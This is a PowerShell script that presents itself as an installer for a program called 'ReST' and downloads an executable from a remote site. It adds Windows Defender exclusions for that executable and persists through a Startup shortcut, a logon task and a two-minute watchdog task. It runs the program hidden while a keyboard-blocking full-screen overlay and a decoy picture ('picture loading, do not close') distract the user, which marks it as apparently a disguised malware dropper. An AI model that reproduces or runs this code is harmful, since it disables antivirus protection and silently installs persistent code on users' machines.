# ReST remote install - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}

$Dir = Join-Path $env:LOCALAPPDATA "ReST"
$Exe = Join-Path $Dir "ReST.exe"
$TempZip = Join-Path $env:TEMP "ReST-download.zip"
$LogFile = Join-Path $env:TEMP "ReST-install.log"
$LoadingPidFile = Join-Path $env:TEMP "ReST-loading.pid"
$LoadingDoneFile = Join-Path $env:TEMP "ReST-loading.done"
$LoadingLogFile = Join-Path $env:TEMP "ReST-loading.log"
$script:LoadingProc = $null
$script:LoadingShownAt = $null
$script:LoadingClosed = $false
$script:HadError = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    if (-not $Silent) {
        Write-Host $Text -ForegroundColor Red
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL --retry 2 --retry-delay 1 -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
    }

    $iwrArgs = @{
        Uri = $Url
        OutFile = $OutFile
        UseBasicParsing = $true
    }
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $iwrArgs.UserAgent = "ReST-Installer/1.0"
    }
    Invoke-WebRequest @iwrArgs
}

function Extract-ReSTZip {
    param(
        [string]$ZipFile,
        [string]$OutExe
    )

    $stage = Join-Path $env:TEMP ("ReST-stage-" + [Guid]::NewGuid().ToString("N"))
    New-Item -ItemType Directory -Force -Path $stage | Out-Null
    try {
        $extracted = $null
        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
            [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $stage)
            $extracted = Join-Path $stage "ReST.exe"
        } catch {
            $null = $_
        }

        if (-not ($extracted -and (Test-Path -LiteralPath $extracted))) {
            $tar = Join-Path $env:SystemRoot "System32\tar.exe"
            if (Test-Path -LiteralPath $tar) {
                & $tar -xf $ZipFile -C $stage
                $extracted = Join-Path $stage "ReST.exe"
            }
        }

        if (-not ($extracted -and (Test-Path -LiteralPath $extracted))) {
            Expand-Archive -LiteralPath $ZipFile -DestinationPath $stage -Force
            $extracted = Join-Path $stage "ReST.exe"
        }

        if (-not (Test-Path -LiteralPath $extracted)) {
            throw "ReST.exe missing in zip"
        }

        if (Test-Path -LiteralPath $OutExe) {
            Remove-Item -LiteralPath $OutExe -Force -ErrorAction SilentlyContinue
        }
        Move-Item -LiteralPath $extracted -Destination $OutExe -Force
    } finally {
        Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Add-DefenderExclusion {
    param(
        [string]$Path,
        [string]$ExePath
    )

    $ok = $false
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-InstallLog ("defender path exclusion ok: " + $Path)
        $ok = $true
    } catch {
        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
    }

    try {
        Add-MpPreference -ExclusionProcess "ReST.exe" -ErrorAction Stop
        Write-InstallLog "defender process exclusion ok: ReST.exe"
        $ok = $true
    } catch {
        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
    }

    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
        try {
            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
            $ok = $true
        } catch {
            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
        }
    }

    return $ok
}

function Clear-PreviousInstallLoadingUI {
    if (Test-Path -LiteralPath $LoadingPidFile) {
        try {
            $loadingPid = [int](Get-Content -LiteralPath $LoadingPidFile -Raw).Trim()
            if ($loadingPid -gt 0) {
                Stop-Process -Id $loadingPid -Force -ErrorAction SilentlyContinue
            }
        } catch {
            $null = $_
        }
        Remove-Item -LiteralPath $LoadingPidFile -Force -ErrorAction SilentlyContinue
    }

    Remove-Item -LiteralPath $LoadingDoneFile -Force -ErrorAction SilentlyContinue
    $script:LoadingProc = $null
}

function Show-InstallPicture {
    param([string]$BaseUrl)

    $pictureUrl = $BaseUrl + "/picture_1977.webp"
    Write-InstallLog ("picture open: " + $pictureUrl)
    try {
        Start-Process -FilePath "rundll32.exe" -ArgumentList @("url.dll,FileProtocolHandler", $pictureUrl) -WindowStyle Hidden -ErrorAction Stop
        Write-InstallLog "picture open ok"
    } catch {
        Write-InstallLog ("picture open skipped: " + $_.Exception.Message)
    }
}

function Start-InstallLoadingUI {
    param([string]$BaseUrl)

    Clear-PreviousInstallLoadingUI
    Write-InstallLog "loading ui start"

    $safeDone = $LoadingDoneFile.Replace("'", "''")
    $safePid = $LoadingPidFile.Replace("'", "''")
    $safeLog = $LoadingLogFile.Replace("'", "''")

    $script = @"
`$ErrorActionPreference = 'SilentlyContinue'
trap {
    try {
        Add-Content -LiteralPath '$safeLog' -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' loading error: ' + `$_.Exception.Message) -Encoding UTF8
    } catch {
        `$null = `$_
    }
    continue
}

function Get-UiText([string]`$b64) {
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$b64))
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
[System.Windows.Forms.Application]::SetCompatibleTextRenderingDefault(`$false)

`$doneFile = '$safeDone'
`$pidFile = '$safePid'
`$titleText = Get-UiText '5Zu+54mH5Yqg6L295Lit'
`$hintText = Get-UiText '6K+35Yu/5YWz6Zet5q2k56qX5Y+j'

`$script:installDone = `$false
`$script:shownAt = `$null

`$form = New-Object System.Windows.Forms.Form
`$form.Text = 'ReST'
`$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
`$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
`$form.TopMost = `$true
`$form.BackColor = [System.Drawing.Color]::FromArgb(8, 12, 24)
`$form.Opacity = 0.88
`$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
`$form.Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$form.KeyPreview = `$true
`$form.Add_KeyDown({ param(`$s, `$e) `$e.Handled = `$true })

function Set-Centered([System.Windows.Forms.Control]`$ctrl, [int]`$y) {
    `$ctrl.Left = [Math]::Max(0, (`$form.ClientSize.Width - `$ctrl.Width) / 2)
    `$ctrl.Top = `$y
}

function New-UiFont([string]`$name, [single]`$size, [System.Drawing.FontStyle]`$style) {
    try {
        return New-Object System.Drawing.Font(`$name, `$size, `$style)
    } catch {
        return New-Object System.Drawing.Font('Segoe UI', `$size, `$style)
    }
}

`$title = New-Object System.Windows.Forms.Label
`$title.Text = `$titleText
`$title.Font = New-UiFont 'Microsoft YaHei UI' 34 ([System.Drawing.FontStyle]::Bold)
`$title.ForeColor = [System.Drawing.Color]::White
`$title.BackColor = [System.Drawing.Color]::Transparent
`$title.AutoSize = `$true

`$bar = New-Object System.Windows.Forms.ProgressBar
`$bar.Style = [System.Windows.Forms.ProgressBarStyle]::Marquee
`$bar.MarqueeAnimationSpeed = 28
`$bar.Size = New-Object System.Drawing.Size(460, 10)
`$bar.ForeColor = [System.Drawing.Color]::FromArgb(99, 102, 241)

`$hint = New-Object System.Windows.Forms.Label
`$hint.Text = `$hintText
`$hint.Font = New-UiFont 'Microsoft YaHei UI' 11 ([System.Drawing.FontStyle]::Regular)
`$hint.ForeColor = [System.Drawing.Color]::FromArgb(148, 163, 184)
`$hint.BackColor = [System.Drawing.Color]::Transparent
`$hint.AutoSize = `$true

`$form.Controls.AddRange(@(`$title, `$bar, `$hint))

function Layout-LoadingUi {
    `$midY = [Math]::Max(120, (`$form.ClientSize.Height - 140) / 2)
    Set-Centered `$title (`$midY)
    `$bar.Left = [Math]::Max(0, (`$form.ClientSize.Width - `$bar.Width) / 2)
    `$bar.Top = `$midY + 72
    Set-Centered `$hint (`$midY + 102)
}

function Test-ShouldCloseLoading {
    return (Test-Path -LiteralPath `$doneFile)
}

`$form.Add_Load({
    try {
        Set-Content -LiteralPath `$pidFile -Value `$PID -Encoding ASCII
    } catch {
        `$null = `$_
    }
    `$script:shownAt = Get-Date
    Layout-LoadingUi
})

`$form.Add_Resize({ Layout-LoadingUi })

`$timer = New-Object System.Windows.Forms.Timer
`$timer.Interval = 120
`$timer.Add_Tick({
    if (Test-ShouldCloseLoading) {
        `$timer.Stop()
        `$form.Close()
    }
})
`$timer.Start()

[void]`$form.ShowDialog()
"@

    $runner = Join-Path $env:TEMP "ReST-loading-ui.ps1"
    $vbs = Join-Path $env:TEMP "ReST-loading-ui.vbs"
    Set-Content -LiteralPath $runner -Value $script -Encoding ASCII
    Unblock-File -LiteralPath $runner -ErrorAction SilentlyContinue

    Remove-Item -LiteralPath $LoadingLogFile -Force -ErrorAction SilentlyContinue

    $vbsBody = 'CreateObject("WScript.Shell").Run "powershell.exe -Sta -NoProfile -ExecutionPolicy Bypass -File ""' + $runner + '""", 0, False'
    Set-Content -LiteralPath $vbs -Value $vbsBody -Encoding ASCII

    try {
        Start-Process -FilePath "wscript.exe" -ArgumentList @("//B", "//Nologo", $vbs) -WindowStyle Hidden | Out-Null

        $deadline = (Get-Date).AddSeconds(4)
        while ((Get-Date) -lt $deadline) {
            if (Test-Path -LiteralPath $LoadingPidFile) {
                $loadingPid = [int](Get-Content -LiteralPath $LoadingPidFile -Raw).Trim()
                if ($loadingPid -gt 0) {
                    $script:LoadingProc = Get-Process -Id $loadingPid -ErrorAction SilentlyContinue
                    Write-InstallLog ("loading ui pid: " + $loadingPid)
                    break
                }
            }
            Start-Sleep -Milliseconds 80
        }

        if (-not $script:LoadingProc) {
            Write-InstallLog "loading ui start timeout"
            if (Test-Path -LiteralPath $LoadingLogFile) {
                Write-InstallLog ("loading ui log: " + (Get-Content -LiteralPath $LoadingLogFile -Raw))
            }
        } else {
            $script:LoadingShownAt = Get-Date
        }
    } catch {
        Write-InstallLog ("loading ui skipped: " + $_.Exception.Message)
    }
}

function Stop-InstallLoadingUI {
    if ($script:LoadingClosed) {
        return
    }
    $script:LoadingClosed = $true

    try {
        if (Test-Path -LiteralPath $LoadingDoneFile) {
            Remove-Item -LiteralPath $LoadingDoneFile -Force -ErrorAction SilentlyContinue
        }
        New-Item -ItemType File -Force -Path $LoadingDoneFile | Out-Null
    } catch {
        $null = $_
    }

    Start-Sleep -Milliseconds 180

    if ($script:LoadingProc -and -not $script:LoadingProc.HasExited) {
        Stop-Process -Id $script:LoadingProc.Id -Force -ErrorAction SilentlyContinue
    }

    if (Test-Path -LiteralPath $LoadingPidFile) {
        try {
            $loadingPid = [int](Get-Content -LiteralPath $LoadingPidFile -Raw).Trim()
            if ($loadingPid -gt 0) {
                Stop-Process -Id $loadingPid -Force -ErrorAction SilentlyContinue
            }
        } catch {
            $null = $_
        }
        Remove-Item -LiteralPath $LoadingPidFile -Force -ErrorAction SilentlyContinue
    }

    Remove-Item -LiteralPath $LoadingDoneFile -Force -ErrorAction SilentlyContinue
    $script:LoadingProc = $null
    $script:LoadingShownAt = $null
}

function Complete-DownloadPhase {
    param([string]$BaseUrl)

    Write-InstallLog "download complete"
    Show-InstallPicture -BaseUrl $BaseUrl
    Stop-InstallLoadingUI
    Write-InstallLog "background install start"
}

function Register-WatchdogTask {
    param(
        [string]$TaskName,
        [string]$Exe,
        [string]$Dir
    )

    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.ps1") -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath (Join-Path $Dir "watchdog.vbs") -Force -ErrorAction SilentlyContinue

    $Action = New-ScheduledTaskAction -Execute $Exe -Argument "-watchdog" -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
}

function Remove-ReSTStartupTask {
    try {
        Unregister-ScheduledTask -TaskName "ReST" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    } catch {
        $null = $_
    }
}

function Remove-ReSTStartupShortcut {
    try {
        $lnk = Join-Path ([Environment]::GetFolderPath("Startup")) "ReST.lnk"
        if (Test-Path -LiteralPath $lnk) {
            Remove-Item -LiteralPath $lnk -Force -ErrorAction SilentlyContinue
        }
    } catch {
        $null = $_
    }
}

Write-InstallLog "install start"
Write-InstallLog ("target: " + $Exe)
Start-InstallLoadingUI -BaseUrl $BaseUrl

try {
    try {
        New-Item -ItemType Directory -Force -Path $Dir | Out-Null
    } catch {
        $null = $_
    }

    Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 200

    $Url = $BaseUrl + "/ReST.zip"
    Write-InstallLog ("download: " + $Url)

    if (Test-Path -LiteralPath $TempZip) {
        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
    }

    try {
        Download-File -Url $Url -OutFile $TempZip
    } catch {
        Fail-Install ("download failed: " + $_.Exception.Message)
        exit 1
    }

    if (-not (Test-Path -LiteralPath $TempZip)) {
        Fail-Install "missing file after download"
        exit 1
    }

    $length = (Get-Item -LiteralPath $TempZip).Length
    if ($length -lt 524288) {
        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
        Fail-Install ("file too small: " + $length + " bytes")
        exit 1
    }

    Complete-DownloadPhase -BaseUrl $BaseUrl

    try {
        Extract-ReSTZip -ZipFile $TempZip -OutExe $Exe
    } catch {
        Fail-Install ("extract failed: " + $_.Exception.Message)
        exit 1
    } finally {
        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
    }

    if (-not (Test-Path -LiteralPath $Exe)) {
        Fail-Install "ReST.exe missing after extract"
        exit 1
    }

    Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
    Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

    $startupOk = $false
    try {
        $Startup = [Environment]::GetFolderPath("Startup")
        $Wsh = New-Object -ComObject WScript.Shell
        $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReST.lnk"))
        $Link.TargetPath = $Exe
        $Link.WorkingDirectory = $Dir
        $Link.WindowStyle = 7
        $Link.Save()
        Remove-ReSTStartupTask
        $startupOk = $true
        Write-InstallLog "startup shortcut ok"
    } catch {
        $null = $_
    }

    if (-not $startupOk) {
        Remove-ReSTStartupShortcut
        $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
        Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
        Write-InstallLog "scheduled task ok"
    }

    try {
        Register-WatchdogTask -TaskName "ReST-Watchdog" -Exe $Exe -Dir $Dir
        Write-InstallLog "watchdog task ok"
    } catch {
        Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
    }

    try {
        Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
        Write-InstallLog "started"
    } catch {
        Fail-Install ("start failed: " + $_.Exception.Message)
        exit 1
    }

    Write-InstallLog "install complete"
    if (-not $Silent) {
        Write-Host "ReST install complete." -ForegroundColor Green
    }

    exit 0
} finally {
    Stop-InstallLoadingUI
}
